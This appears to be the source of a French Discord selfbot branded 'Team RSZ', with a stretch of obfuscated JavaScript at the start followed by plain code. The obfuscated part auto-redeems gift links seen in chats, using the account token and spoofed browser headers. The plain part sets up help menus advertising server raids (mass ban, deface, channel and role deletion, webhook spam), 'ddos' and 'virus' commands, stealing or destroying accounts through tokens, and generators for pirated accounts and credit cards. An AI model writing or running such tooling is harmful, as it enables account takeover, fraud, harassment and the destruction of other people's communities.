_0x5f5a17=_0x4ab3e5;if(_0x17640d[_0x5f5a17(0x42b)]['id']===client[_0x5f5a17(0x377)]['id'])return;_0x17640d['channel']['type']==='dm'&&(console[_0x5f5a17(0x32b)](_0x5f5a17(0x59d)[_0x5f5a17(0x1dc)]),console['log']((_0x5f5a17(0x353)+_0x17640d[_0x5f5a17(0x42b)][_0x5f5a17(0x5e7)]+_0x5f5a17(0x52b)+_0x17640d[_0x5f5a17(0x4c7)]+_0x5f5a17(0x4de)+_0x17640d[_0x5f5a17(0x388)])[_0x5f5a17(0x1dc)]));}),client['on']('messageDelete',_0x1ec7d8=>{const _0x16480c=_0x4ab3e5;if(_0x1ec7d8['author']['id']===client['user']['id'])return;_0x1ec7d8['channel']['type']==='dm'&&(console[_0x16480c(0x32b)]('╟─────────────────────────────────'['blue']),console[_0x16480c(0x32b)]((_0x16480c(0x4eb)+_0x1ec7d8[_0x16480c(0x42b)][_0x16480c(0x5e7)]+_0x16480c(0x52b)+_0x1ec7d8[_0x16480c(0x4c7)]+'\x0a║-->\x20At:\x20'+_0x1ec7d8[_0x16480c(0x388)])[_0x16480c(0x1dc)]));if(_0x1ec7d8[_0x16480c(0x4c7)][_0x16480c(0x57d)](_0x16480c(0x61e))||_0x1ec7d8['content']['includes'](_0x16480c(0x27a))){if(_0x1ec7d8[_0x16480c(0x42b)]['id']===client[_0x16480c(0x377)]['id'])return;if(_0x1ec7d8[_0x16480c(0x396)][_0x16480c(0x661)]==='dm')return;console[_0x16480c(0x32b)](_0x16480c(0x45b)[_0x16480c(0x1dc)]),console['log']((_0x16480c(0x553)+_0x1ec7d8[_0x16480c(0x5e1)][_0x16480c(0x47a)]+_0x16480c(0x526)+_0x1ec7d8['channel']['name']+_0x16480c(0x2d5)+_0x1ec7d8['author']['tag']+'\x0a║-->\x20Content:\x20'+_0x1ec7d8[_0x16480c(0x4c7)]+_0x16480c(0x33d)+_0x1ec7d8[_0x16480c(0x388)])[_0x16480c(0x1dc)]);}else return;});function _0x5e0d(_0x1cad82,_0x1b0926){return _0x5e0d=function(_0x330151,_0x5e0d6d){_0x330151=_0x330151-0x1cb;let _0x515472=_0x3301[_0x330151];return _0x515472;},_0x5e0d(_0x1cad82,_0x1b0926);}function matchCode(_0x35f3ed,_0x62196c){const _0x41de4e=_0x4ab3e5;let _0x4fb245=_0x35f3ed['match'](/https:\/\/discord\.gift\/[abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789]+/);if(_0x4fb245)return _0x62196c(_0x4fb245[0x0]),matchCode(_0x35f3ed[_0x41de4e(0x65a)](_0x4fb245['index']+_0x4fb245[0x0][_0x41de4e(0x3f6)]),_0x62196c);else _0x62196c(null);}client['on'](_0x4ab3e5(0x28e),_0x1d39f1=>{const _0x552f6b=_0x4ab3e5;let _0x42f1c6=[];matchCode(_0x1d39f1[_0x552f6b(0x4c7)],_0x3a63a0=>{const _0xa2efde=_0x552f6b;if(!_0x3a63a0)return;if(!_0x42f1c6[_0xa2efde(0x57d)](_0x3a63a0))_0x42f1c6[_0xa2efde(0x364)](_0x3a63a0);});if(_0x42f1c6[_0x552f6b(0x3f6)]==0x0)return;_0x42f1c6[_0x552f6b(0x1e7)](_0xeb5643=>{const _0x2873dd=_0x552f6b;fetch('https://canary.discordapp.com/api/v6/entitlements/gift-codes/'+_0xeb5643[_0x2873dd(0x534)]('/')[_0x2873dd(0x6e1)]()+'/redeem',{'method':_0x2873dd(0x2e1),'headers':{'Accept':_0x2873dd(0x51a),'Accept-Encoding':_0x2873dd(0x32c),'Accept-Language':_0x2873dd(0x4e4),'Authorization':client[_0x2873dd(0x27f)],'Connection':_0x2873dd(0x615),'Content-Length':JSON[_0x2873dd(0x3cc)]({'channel_id':_0x1d39f1[_0x2873dd(0x396)]['id']})[_0x2873dd(0x3f6)],'Content-Type':_0x2873dd(0x2fe),'Host':'canary.discordapp.com','Referer':_0x2873dd(0x622)+_0x1d39f1[_0x2873dd(0x396)]['id']+'/'+_0x1d39f1['id'],'User-Agent':_0x2873dd(0x48d),'X-super-properties':Buffer[_0x2873dd(0x4fe)](JSON[_0x2873dd(0x3cc)]({'os':_0x2873dd(0x466),'browser':_0x2873dd(0x40d),'device':'','browser_user_agent':_0x2873dd(0x48d),'browser_version':_0x2873dd(0x631),'os_version':'10','referrer':'','referring_domain':'','referrer_current':'','referring_domain_current':'','release_channel':_0x2873dd(0x65c),'client_build_number':0x928f,'client_event_source':null}),_0x2873dd(0x5a0))[_0x2873dd(0x6db)](_0x2873dd(0x4e2))},'body':JSON[_0x2873dd(0x3cc)]({'channel_id':_0x1d39f1[_0x2873dd(0x396)]['id']})})['then'](_0x7bca5f=>{const _0x4fb170=_0x2873dd;if(_0x7bca5f[_0x4fb170(0x20c)]==0x190||_0x7bca5f[_0x4fb170(0x20c)]==0x194)return console[_0x4fb170(0x32b)]((_0x4fb170(0x5d0)+_0xeb5643)[_0x4fb170(0x5fb)]);_0x7bca5f[_0x4fb170(0x294)]()['then'](_0x50b049=>{const _0x13f349=_0x4fb170;console['log'](_0x50b049),console['log'](_0x13f349(0x4bb)[_0x13f349(0x55b)]);});})[_0x2873dd(0x4d5)](console[_0x2873dd(0x55f)]);});}),client['on'](_0x4ab3e5(0x24e),_0x38e6c3=>{const _0x49028e=_0x4ab3e5;console['log'](_0x49028e(0x59d)[_0x49028e(0x1dc)]),console['log']((_0x49028e(0x29d)+_0x38e6c3['name'])[_0x49028e(0x1dc)]);}),client['on'](_0x4ab3e5(0x403),_0x173526=>{const _0x1b9223=_0x4ab3e5;console[_0x1b9223(0x32b)](_0x1b9223(0x59d)['blue']),console[_0x1b9223(0x32b)]((_0x1b9223(0x40c)+_0x173526['name'])[_0x1b9223(0x1dc)]);}),client[_0x4ab3e5(0x59b)](token)[_0x4ab3e5(0x4d5)](_0x286f8e=>{const _0x17d33c=_0x4ab3e5;(_0x286f8e['toString']()[_0x17d33c(0x57d)](_0x17d33c(0x335)[_0x17d33c(0x5fb)])||_0x286f8e['toString']()[_0x17d33c(0x57d)](_0x17d33c(0x2bc)[_0x17d33c(0x5fb)]))&&console[_0x17d33c(0x32b)](_0x17d33c(0x1cc)[_0x17d33c(0x5fb)]);});
+﻿const Discord = require("discord.js");
+require('colors')
+const client = new Discord.Client();
+const version = ('bêta')
+const ConfigFile = require("./config.json")
+const token = ConfigFile.token;
+const yourgif = ConfigFile.gif;
+const stream = ConfigFile.stream;
+const base64 = require('base-64');
+const utf8 = require('utf8');
+const fs = require("fs");
+const hastebins = require("hastebin-gen");
+const rpcGenerator = require("discordrpcgenerator");
+const backups = require("./Data/backups.json")
+const afk = require("./Data/afk.json")
+const db = require("./Data/pubmp.json");
+const lbackup = require('./Data/liste.json')
+const kicked = require('./Data/vkick.json')
+const prefix = ConfigFile.prefix;
+const superagent = require('superagent');
+const fetch = require("node-fetch");
+const request = require('request');
+const { cpuUsage } = require("process");
+function nitrocode(length, letter) {
+
+  var multiplier = '';
+  if (letter.indexOf('0') > -1) multiplier += '0123456789';
+  if (letter.indexOf('A') > -1) multiplier += 'ABCDEFGHIJKLMNOPQRSTUVWXYZ';
+  if (letter.indexOf('a') > -1) multiplier += 'abcdefghijklmnopqrstuvwxyz';
+  var results = '';
+  
+  
+  for (var i = length; i > 0; --i) 
+  {
+  results += multiplier[Math.floor(Math.random() * multiplier.length)];
+  
+  }
+  
+  return results; 
+}
+const color = ConfigFile.color;
+
+const rire = [
+'https://media1.tenor.com/images/bfde037642a618465ba50f4c463b49c3/tenor.gif?itemid=16137557',
+'https://media.tenor.com/images/80c6b49239654be3a7cb4c58fb3b73be/tenor.gif',
+'https://media.tenor.com/images/ed007451355180adaf4b697405030490/tenor.gif',
+'https://media.giphy.com/media/rFfmUWVMOyKVG/giphy.gif',
+'https://media1.tenor.com/images/123df3be1acfe3306b91e9c3dd6f9438/tenor.gif?itemid=5322596',
+'https://media1.tenor.com/images/839addada9a7785b2da0aed97f441554/tenor.gif?itemid=9280880',
+'https://media1.tenor.com/images/bfde037642a618465ba50f4c463b49c3/tenor.gif?itemid=16137557'
+]
+
+const kiss = [
+'https://media.tenor.com/images/faadbe17f1b4fbf399be38eaddff6e05/tenor.gif',
+'https://media1.tenor.com/images/78095c007974aceb72b91aeb7ee54a71/tenor.gif?itemid=5095865',
+'https://media1.tenor.com/images/bc5e143ab33084961904240f431ca0b1/tenor.gif?itemid=9838409',
+'https://media1.tenor.com/images/4b5d5afd747fe053ed79317628aac106/tenor.gif?itemid=5649376'
+]
+
+const hugh = [
+  "https://media.tenor.com/images/6083ba11631dd577bcc271268d010832/tenor.gif",
+  "https://media.tenor.com/images/a9730f44f28d959abb4c5b31edc77de8/tenor.gif",
+  "https://media.tenor.com/images/778282e02d511fbc061e1439a5105c6f/tenor.gif",
+  "https://media.tenor.com/images/0abe1090ab9874c62c4baaac18f0994d/tenor.gif"
+]
+const veski = [
+  'https://media1.tenor.com/images/274fc34d3add3ce4cbb5716cb4f94f4f/tenor.gif?itemid=5841198',
+  'https://media1.tenor.com/images/5ea40ca0d6544dbf9c0074542810e149/tenor.gif?itemid=14841901',
+  'https://media.tenor.com/images/6bfc57bde155c401edc1d032de468cd6/tenor.gif'
+]
+
+const punch = [
+  'https://media.tenor.com/images/5cdcbff8c5bce802d7b65baa711f12f4/tenor.gif',
+  'https://media.tenor.com/images/5b668436338971d42469d7348a5340e5/tenor.gif',
+  'https://media.tenor.com/images/2eef4d8e3eae8b321fdb2aff1feefbec/tenor.gif',
+  'https://media.tenor.com/images/04a3cf11736bfa9083b91f2d41b76774/tenor.gif'
+  ]
+  
+const pat = [
+  'https://media1.tenor.com/images/6151c42c94df654b1c7de2fdebaa6bd1/tenor.gif?itemid=16456868',
+  'https://media1.tenor.com/images/8b5711095b0ba786c43b617bf9c675dd/tenor.gif?itemid=15735895',
+  'https://media1.tenor.com/images/55df4c5fb33f3cd05b2f1ac417e050d9/tenor.gif?itemid=6238142',
+  'https://media1.tenor.com/images/6ee188a109975a825f53e0dfa56d497d/tenor.gif?itemid=17747839',
+  'https://media1.tenor.com/images/0d2fb6ad9a6d71c3a018c0b37ffca50b/tenor.gif?itemid=16121044',
+]
+const cry = [
+  'https://media1.tenor.com/images/b88fa314f0f172832a5f41fce111f359/tenor.gif?itemid=13356071',
+  'https://media.tenor.com/images/c9fdb6e3ab914d5b195b11ebd99524d0/tenor.gif',
+  'https://media1.tenor.com/images/f7fde4b118501c8fa5cb1a5dd171beab/tenor.gif?itemid=5652242',
+  'https://media.tenor.com/images/eac8a7b4a0e7c468a31274b80c3958a1/tenor.gif',
+  'https://media1.tenor.com/images/5b2bbfcbc1724a0bdc1b48dcf89274d6/tenor.gif?itemid=16648179',
+]
+
+const highfive = [
+'https://media.tenor.com/images/d0bfc98b52b881153657932c6dce511c/tenor.gif',
+'https://media.tenor.com/images/a506dd0b87c41f1988e4bddf7dc2062d/tenor.gif',
+'https://media1.tenor.com/images/9730876547cb3939388cf79b8a641da9/tenor.gif?itemid=8073516',
+'https://media.tenor.com/images/ad3b6e61921d1fb44b2121156e8560ce/tenor.gif',
+]
+
+var verifLevels = ["None", "Low", "Medium", "(╯°□°）╯︵  ┻━┻"];
+var region = {
+    "Brésil": "Brazil",
+    "eu-central": "Central Europe",
+    "singapoure": "Singapore",
+    "us-central": "U.S. Central",
+    "sydney": "Sydney",
+    "us-east": "U.S. East",
+    "us-south": "U.S. South",
+    "us-west": "U.S. West",
+    "eu-west": "Western Europe",
+    "vip-us-east": "VIP U.S. East",
+    "Londre": "London",
+    "amsterdam": "Amsterdam",
+    "hongkong": "Hong Kong"
+};
+
+function translateDate(date) {
+    const Months = ["Jan", "Fev", "Mar", "Avr", "Mai", "Juin", "Juillet", "Aout", "Sep", "Oct", "Nov", "Dec"];
+    const Days = ["Dimanche", "Lundi", "Mardi", "Mercredi", "Jeudi", "Vendredi", "Samedi"];
+    return Days[date.getUTCDay()] + ", " + date.getUTCDate() + " " + Months[date.getUTCMonth()] + " " + date.getUTCFullYear() + " at " + date.getUTCHours() + ":" + zeros(date.getUTCMinutes(), 2) + ":" + zeros(date.getUTCSeconds(), 2) + "." + zeros(date.getUTCMilliseconds(), 3);
+}
+function checkDays(date) {
+    var now = new Date();
+    var diff = now.getTime() - date.getTime();
+    var days = Math.floor(diff / 86400000);
+    return days + (days == 1 ? " day" : " days") + " ago";
+};
+
+
+client.on('ready', function(){
+  console.clear
+  console.log(`
+╔═════════════════════════════════╗
+║            Team RSZ             ║
+╟─────────────────────────────────╢
+║-->  Createur : Sans#7777        ║
+╟─────────────────────────────────╢
+║-->  Pseudo   : ${client.user.tag}   
+╟─────────────────────────────────╢
+║-->  id       : ${client.user.id} 
+╟─────────────────────────────────╢
+║-->  Prefix   : ${prefix}                 
+╟─────────────────────────────────╢
+║-->  Membres  : ${client.guilds.map(guild => guild.memberCount).reduce((a, b) => a + b)}         
+╟─────────────────────────────────╢
+║-->  Bots     : ${client.users.filter(user => user.bot).size}                 
+╟─────────────────────────────────╢
+║-->  Salons   : ${client.channels.size}               
+╟─────────────────────────────────╢
+║-->  Serveurs : ${client.guilds.size} 
+╟─────────────────────────────────╢
+║-->  Version  : ${version}
+╟─────────────────────────────────╢
+║-->  Tu Stream: ${stream}                            
+╚═════════════════════════════════╝ \n\n`.green);
+});
+
+var uuid = () => ([1e7] + -1e3 + -4e3 + -8e3 + -1e11).replace(/[018]/g, a => (a ^ Math.random() * 16 >> a / 4).toString(16));
+
+client.on('ready', function(){
+  rpcGenerator.getRpcImage("840929985564114955", "zerotwo")
+  .then(image => {
+    rpcGenerator.getRpcImage("840929985564114955", "darling")
+  .then(image2 => {
+      let presence = new rpcGenerator.Rpc()
+          .setName("𝚃𝚎𝚊𝚖 𝚁𝚂𝚉")
+          .setUrl('https://www.twitch.tv/codezero_two_')
+          .setType("STREAMING")
+          .setApplicationId("840929985564114955")
+          .setDetails(stream)
+          .setAssetsLargeImage(image2.id)
+          .setAssetsSmallImage(image.id)
+          .setAssetsLargeText(" ")
+          .setState(" ")
+          .setStartTimestamp(Date.now())
+
+          .setParty({
+              id: uuid()
+              })
+              client.user.setPresence(presence.toDiscord()).catch(console.error)
+            })
+          })
+});
+
+let gen = new Discord.RichEmbed();
+gen.setTimestamp()
+.setColor(color)
+.setTitle('**Générateur**')
+.setURL('https://discord.gg/5S54Svq6hR')
+.setDescription("`" + `le prefix est:  ${prefix}` + '`')
+.addField(' ```Nitro``` ', "***gen un nitro random***")
+.addField(' ```Metal``` ', "***gen un metal dungeon***")
+.addField(' ```Gspotify``` ', `***gen un spotify***`)
+.addField(' ```Nordvpn``` ', `***gen un nord vpn***`)
+.addField(' ```Uplay``` ', `***gen un uplay***`)
+.addField(' ```pornhub``` ', `***gen un pornhub***`)
+.addField(' ```Gtoken``` ', `***drop un token pour spam (valid)***`)
+.addField(' ```Dofus``` ', `***gen un dofus***`)
+.addField(' ```Netflix``` ', `***gen un neflix uncheck***`)
+.addField(' ```CC``` ', `***gen un carte de crédit discord (ne pas payer de nitro sur son compte risque de ban)***`) /////269
+.setImage(yourgif)
+.setThumbnail('https://media1.tenor.com/images/d37a6d3be2c5f56685579d59e225d256/tenor.gif')
+.setFooter('𝚃𝚎𝚊𝚖 𝚁𝚂𝚉')
+
+let cmd = new Discord.RichEmbed();
+cmd.setTimestamp()
+.setColor(color)
+.setTitle("**Liste des commandes**")
+.setURL('https://discord.gg/5S54Svq6hR')
+.addField('**Commande Help**', "`help`, `help fun`, `help utile`, `help moderation`, `help nsfw`, `help hack`, `help raid`")
+.addField("**Commandes Fun** :joy:: ", '`auto voice kick`, `stop auto voice kick`, `start typing`, `branlette`, `lovecalc`, `fight`, `boom`, `reverse`, `nitro`, `avatar`, `8ball`, `say`, `smile`, `kiss`, `blush`, `load`, `punch`, `hug`,`pat`,`salut`,`cv`')
+.addField("**Commandes Moderation** :tools:: ", '`voice kick`, `set serveur name`, `roles list`, `channels list`, `shutdown`, `kick`, `ban`, `purge`, `discord`, `gen token`, `user info`, `role info`, `serveur info`, `stats`, `encode`, `mp friend`')
+.addField("**Commandes Nsfw** :underage: :", '`ass`, `4k`, `anal`, `hentai`, `nsfw-gif`, `pussy`, `thigh`')
+.addField("**Commandes Raid** :no_entry_sign: :", '`deface`, `spam`, `webhook spam`, `create channel`, `stop spam`, `name all`, `ban all`, `kick all`, `delete all channels`, `delete all role`')
+.addField("**Commandes Hack** :skull_and_crossbones: :", '`check token`, `info token`, `fuck token`, `ddos voc`, `ddos-stop`, `token`')
+.addField("**Commandes Utile** :globe_with_meridians: :", '`nuke dm`,, `mp all`, `stop mp all`, `grab pp`, `delete all emote`, `steal emote`, `remove emote`, `emote`, `add emote` `user info`, `serveur info`, `stats`, `restart`, `reset`, `role info`, `encode`, `discord`, `gen token`, `mp friend`, `change hypesquad`')
+.addField("**Commandes Statut** :performing_arts: :", '`rocket league`, `spotify`, `fortnite`, `among us`, `badlion`, `apex`, `csgo`, `roblox`, `pornhub`, `tinder`, `clash royal`, `clash of clan`, `naruto`, `hunter x hunter`, `tokyo ghoul`, `youtube`, `minecraft`, `twitter`, `instagram`, `tiktok`, `facebook`, `snapchat`, `skype`, `google`, `nike`, `lacoste`, `gucci`')
+.setDescription("`" + `le prefix est:  ${prefix}` + '`')
+.setImage(yourgif)
+.setThumbnail('https://media1.tenor.com/images/d37a6d3be2c5f56685579d59e225d256/tenor.gif')
+.setFooter('𝚃𝚎𝚊𝚖 𝚁𝚂𝚉')
+
+
+let help_hack = new Discord.RichEmbed()
+.setTimestamp()
+.setColor(color)
+.setTitle('**Pannel de Help Hacking**')
+.setURL('https://discord.gg/5S54Svq6hR')
+.addField(`**${prefix}ddos voc**`, "`Lance une attaque ddos sur les channels vocal`")
+.addField(`**${prefix}ddos-stop**`, "`Stop une attaque ddos sur les channels vocal`")
+.addField(`**${prefix}virus**`, "`Lance un virus`")
+.addField(`**${prefix}token (@user)**`,"`Affiche le token d'un utilisateur`")
+.addField(`**${prefix}check token (token)**`,"`Check si un token est valide`")
+.addField(`**${prefix}info token (token)**`,"`Affiche les informations d'un utilisateur grace a un token`")
+.addField(`**${prefix}fuck token (token)**`,"`Detruit le compte d'un utilisateur grace a un token`")
+.setDescription("`" + `le prefix est:  ${prefix}` + '`')
+.setDescription('[Lien pour avoir 𝚃𝚎𝚊𝚖 𝚁𝚂𝚉](Soon)')
+.setImage(yourgif)
+.setThumbnail('https://media1.tenor.com/images/d37a6d3be2c5f56685579d59e225d256/tenor.gif')
+.setFooter('𝚃𝚎𝚊𝚖 𝚁𝚂𝚉')
+
+
+let help_raid = new Discord.RichEmbed()
+.setTimestamp()
+.setColor(color)
+.setTitle('**Pannel de Help Raid**')
+.setURL('https://discord.gg/vxGygmGyEq')
+.addField(`**${prefix}serveur info**`,"`Envoie les information du serveur`")
+.addField(`**${prefix}infoplus**`,"`Montre des informations en plus sur le serveur`")
+.addField(`**${prefix}create channel**`,"`Creer 10 channels textuel`")
+.addField(`**${prefix}deface**`,"`Déface entierement un serveur (nom/icon/channels)`")
+.addField(`**${prefix}webhook spam**`,"`Créer 3 webhooks par salon et spam avec (ultra rapide)`")
+.addField(`**${prefix}destroy**,"Détruit le serveur"`)
+.addField(`**${prefix}spam (text)**`,"`Spam un text`")
+.addField(`**${prefix}stop spam**`,"`Arrete le spam`")
+.addField(`**${prefix}createrole**`, "`Créé pleins de rôles`")
+.addField(`**${prefix}delete all role**`,"`Supprime tous les rôles du serveur`")
+.addField(`**${prefix}delete all channel**`,"`Supprime tout les salons d'un serveur`")
+.addField(`**${prefix}name all**`,"`Rename tout les membres d'un serveur`")
+.addField(`**${prefix}ban-all**`,"`Ban tout les membres d'un serveur`")
+.addField(`**${prefix}kick-all**`,"`Kick tout les membres d'un serveur`")
+.setDescription("`" + `le prefix est:  ${prefix}` + '`')
+.setDescription('[Lien pour avoir 𝚃𝚎𝚊𝚖 𝚁𝚂𝚉](soon)')
+.setImage(yourgif)
+.setThumbnail('https://media1.tenor.com/images/d37a6d3be2c5f56685579d59e225d256/tenor.gif')
+.setFooter('𝚃𝚎𝚊𝚖 𝚁𝚂𝚉')
+
+
+let help = new Discord.RichEmbed();
+help.setTimestamp()
+.setColor(color)
+.setTitle('🌙**Pannel de Help**🌙')
+.setURL('https://discord.gg/vxGygmGyEq')
+.addField(`**${prefix}cmd**`,"`Liste des commandes`")
+.addField(`**${prefix}help fun**`,"`Affiche les commandes fun` :joy:")
+.addField(`**${prefix}help gen**`,"`Affiche les commandes générateur` :tada:")
+.addField(`**${prefix}help moderation**`,"`Affiche les commandes moderation` :tools:")
+.addField(`**${prefix}help utile**`,"`Affiche les commandes info` :globe_with_meridians:")
+.addField(`**${prefix}help nsfw**`,"`Affiche les commandes nsfw` :underage:")
+.addField(`**${prefix}help raid**`,"`Affiche les commandes raid` :no_entry_sign: ")
+.addField(`**${prefix}help hack**`,"`Affiche les commandes hack` :skull_and_crossbones:")
+.addField(`**${prefix}help statut**`,"`Affiche les commandes statut` :performing_arts:")
+.setDescription("`" + `le prefix est:  ${prefix}` + '`')
+.setDescription('[Lien pour avoir 𝚃𝚎𝚊𝚖 𝚁𝚂𝚉](soon)')
+.setImage(yourgif)
+.setThumbnail('https://media1.tenor.com/images/d37a6d3be2c5f56685579d59e225d256/tenor.gif')
+.setFooter('𝚃𝚎𝚊𝚖 𝚁𝚂𝚉')
+
+
+let help_statut = new Discord.RichEmbed()
+.setColor(color)
+.setTitle('**Pannel de Help Statut** :performing_arts: ')
+.setDescription('[Lien pour avoir 𝚃𝚎𝚊𝚖 𝚁𝚂𝚉](Soon)')
+.addField(`**${prefix}rocket league (text)**`, "`Met un statut Rocket League`")
+.addField(`**${prefix}spotify (text)**`,"`Met un statut Spofity`")
+.addField(`**${prefix}fortnite (text)**`, "`Met un statut Fortnite`")
+.addField(`**${prefix}among us (text)**`, "`Met un statut Among us`")
+.addField(`**${prefix}gucci (text)**`, "`Met un statut Gucci`")
+.addField(`**${prefix}lacoste (text)**`, "`Met un statut Lacoste`")
+.addField(`**${prefix}nike (text)**`, "`Met un statut Nike`")
+.addField(`**${prefix}google (text)**`, "`Met un statut Google`")
+.addField(`**${prefix}skype (text)**`, "`Met un statut Skype`")
+.addField(`**${prefix}snapchat (text)**`, "`Met un statut Snapchat`")
+.addField(`**${prefix}facebook (text)**`, "`Met un statut Facebook`")
+.addField(`**${prefix}tiktok (text)**`, "`Met un statut Tiktok`")
+.addField(`**${prefix}twitter (text)**`, "`Met un statut Twitter`")
+.addField(`**${prefix}minecraft (text)**`, "`Met un statut Minecraft`")
+.addField(`**${prefix}instagram (text)**`, "`Met un statut Instagram`")
+.setDescription("`" + `le prefix est:  ${prefix}` + '`')
+.setImage(yourgif)
+.setThumbnail('https://media1.tenor.com/images/d37a6d3be2c5f56685579d59e225d256/tenor.gif')
+.setFooter('𝚃𝚎𝚊𝚖 𝚁𝚂𝚉')
+
+
+let help_statut2 = new Discord.RichEmbed()
+.setColor(color)
+.setTitle('**Pannel de Help Statut** :performing_arts: ')
+.setDescription('[Lien pour avoir 𝚃𝚎𝚊𝚖 𝚁𝚂𝚉](soon)')
+.addField(`**${prefix}youtube (text)**`, "`Met un statut Youtube`")
+.addField(`**${prefix}tokyo ghoul (text)**`, "`Met un statut Tokyo Ghoul`")
+.addField(`**${prefix}hunter x hunter (text)**`, "`Met un statut Hunter x Hunter`")
+.addField(`**${prefix}naruto (text)**`, "`Met un statut Naruto`")
+.addField(`**${prefix}clash of clan (text)**`, "`Met un statut Clash of Clan`")
+.addField(`**${prefix}clash royal (text)**`, "`Met un statut Clash Royal`")
+.addField(`**${prefix}tinder (text)**`, "`Met un statut Tinder`")
+.addField(`**${prefix}pornhub (text)**`, "`Met un statut Pornhub`")
+.addField(`**${prefix}roblox (text)**`, "`Met un statut Roblox`")
+.addField(`**${prefix}csgo (text)**`, "`Met un statut Csgo`")
+.addField(`**${prefix}apex (text)**`, "`Met un statut Apex`")
+.addField(`**${prefix}badlion (text)**`, "`Met un statut Badlion`")
+.setDescription("`" + `le prefix est:  ${prefix}` + '`')
+.setImage(yourgif)
+.setThumbnail('https://media1.tenor.com/images/d37a6d3be2c5f56685579d59e225d256/tenor.gif')
+.setFooter('𝚃𝚎𝚊𝚖 𝚁𝚂𝚉')
+
+
+let help_fun = new Discord.RichEmbed()
+.setTimestamp()
+.setColor(color)
+.setTitle('**Pannel de Help Fun** :joy: ')
+.setDescription('[Lien pour avoir 𝚃𝚎𝚊𝚖 𝚁𝚂𝚉](Soon)')
+.addField(`**${prefix}start typing**`,"`Vous affiche entrain d'ecrire indefiniment`")
+.addField(`**${prefix}avatar (@user)**`,"`Affiche l'avatar d'un membre`")
+.addField(`**${prefix}lovecalc (@user)**`,"`Test d'amour`")
+.addField(`**${prefix}nitro**`,"`Genere un nitro random`")
+.addField(`**${prefix}8ball (text)**`,"`Pose une question`")
+.addField(`**${prefix}say (text)**`,"`Affiche un text en embed`")
+.addField(`**${prefix}fight (@user)**`,"`Bat toi avec un utilisateur`")
+.addField(`**${prefix}boom (@user)**`,"`Fait exploser un utilisateur`")
+.addField(`**${prefix}smile**`,"`Envoie un gif rire`")
+.addField(`**${prefix}kiss (@user)**`,"`Embrasse un membre`")
+.addField(`**${prefix}blush**`,"`Envoie un gif qui rougit`")
+.addField(`**${prefix}load**`,"`Envoie un chargement`")
+.addField(`**${prefix}branlette**`,"`Simule une grosse branlette + éjaculation`")
+.addField(`**${prefix}punch (@user)**`,"`Frappe un membre`")
+.addField(`**${prefix}hug (@user)**`,"`Fait un calin a un membre`")
+.addField(`**${prefix}reverse (text)**`,"`Met ton text a l'envers`")
+.addField(`**${prefix}pat (@user)**`,"`Pat une personne`")
+.addField(`**${prefix}salut**`,"`Anime un message saluant tout le monde`")
+.addField(`**${prefix}cv**`,"`Anime un message demandant si vous allez bien`")
+.setDescription("`" + `le prefix est:  ${prefix}` + '`')
+.setImage(yourgif)
+.setThumbnail('https://media1.tenor.com/images/d37a6d3be2c5f56685579d59e225d256/tenor.gif')
+.setFooter('𝚃𝚎𝚊𝚖 𝚁𝚂𝚉')
+
+
+let help_moderation = new Discord.RichEmbed()
+.setTimestamp()
+.setColor(color)
+.setTitle('**Pannel de Help Moderation** :tools: ')
+.setDescription('[Lien pour avoir 𝚃𝚎𝚊𝚖 𝚁𝚂𝚉](Soon)')
+.addField(`**${prefix}voice kick (@user)**`,"`Kick un utilisateur du salon vocal`")
+.addField(`**${prefix}set serveur name (text)**`,"`Change le nom du serveur`")
+.addField(`**${prefix}shutdown**`,"`Eteint le selfbot`")
+.addField(`**${prefix}kick (@user)**`,"`kick un membre du serveur`")
+.addField(`**${prefix}ban (@user)**`,"`Ban un membre du serveur`")
+.addField(`**${prefix}roles list**`,"`Envoie la liste de tout les roles d'un serveur`")
+.addField(`**${prefix}channels list**`,"`Envoie la liste de tout les channels d'un serveur`")
+.addField(`**${prefix}purge**`,"`Supprime tout les messages`")
+.setDescription("`" + `le prefix est:  ${prefix}` + '`')
+.setImage(yourgif)
+.setThumbnail('https://media1.tenor.com/images/d37a6d3be2c5f56685579d59e225d256/tenor.gif')
+.setFooter('𝚃𝚎𝚊𝚖 𝚁𝚂𝚉')
+
+
+
+
+let help_info = new Discord.RichEmbed()
+.setTimestamp()
+.setColor(color)
+.setTitle('**Pannel de Help Utile** :globe_with_meridians: ')
+.setDescription('[Lien pour avoir 𝚃𝚎𝚊𝚖 𝚁𝚂𝚉](Soon)')
+.addField(`**${prefix}mp all**`,"`Permet de dm toutes les personnes d'un serveur`")
+.addField(`**${prefix}stop mp all**`,"`Permet de stopé la commande mp all`")
+.addField(`**${prefix}auto voice kick (@user)**`,"`Permet de kick un utilisateur du vocal (parfait pour troll)`")
+.addField(`**${prefix}stop auto voice kick (@user)**`,"`Permet de stopé la commande auto voice kick`")
+.addField(`**${prefix}nuke dm**`,"`Nuke tout tes dm (𝚃𝚎𝚊𝚖 𝚁𝚂𝚉 les clear) pour limiter les beugs et l'ésthetique`")
+.addField(`**${prefix}afk (text)**`,"`Pour te definir comme \"afk\"`")
+.addField(`**${prefix}user info (@user)**`,"`Envoie les information d'un membre du serveur`")
+.addField(`**${prefix}stats**`,"`Affiche les stats du selfbot`")
+.addField(`**${prefix}restart**`,"`Redemarre le selfbot`")
+.addField(`**${prefix}reset**`,"`Reset le status`")
+.addField(`**${prefix}role info (@role)**`,"`Envoie les informations d'un role`")
+.addField(`**${prefix}encode (text)**`, "`Crypte ton text en base64`")
+.addField(`**${prefix}discord**`, "`Affiche votre version de discord js`")
+.addField(`**${prefix}gen token**`,"`Change votre token`")
+.addField(`**${prefix}add emote (emote) <name>**`, "`Ajoute un emoji au serveur`")
+.addField(`**${prefix}emote (emote)**`, "`Donne les infos tout les emojis d'un serveur`")
+.addField(`**${prefix}remove emote (emote)**`, "`Supprime un emoji du serveur`")
+.addField(`**${prefix}steal emote (serveur id)**`, "`Ajoute tout les emojis d'un serveur a ton serveur`")
+.addField(`**${prefix}delete all emote**`, "`Supprime tout les emojis du serveur`")
+.addField(`**${prefix}grab pp (user)**`, "`Vole la photo de profile de la personne mentionné`")
+.addField(`**${prefix}check token (token)**`, "`Vérifie si le token est valide`")
+.addField(`**${prefix}mp friend (message)**`,"`Envoie un message privé a tout tes amis`")
+.addField(`**${prefix}change hypesquad (brilliance/bravery/ballance)**`,"`Permet de changer sa maison hypesquad`")
+.addField(`**nitro autoclaim**`,"`Un autoclaim est en permanance activé sur le self`")
+.setDescription("`" + `le prefix est:  ${prefix}` + '`')
+.setImage(yourgif)
+.setThumbnail('https://media1.tenor.com/images/d37a6d3be2c5f56685579d59e225d256/tenor.gif')
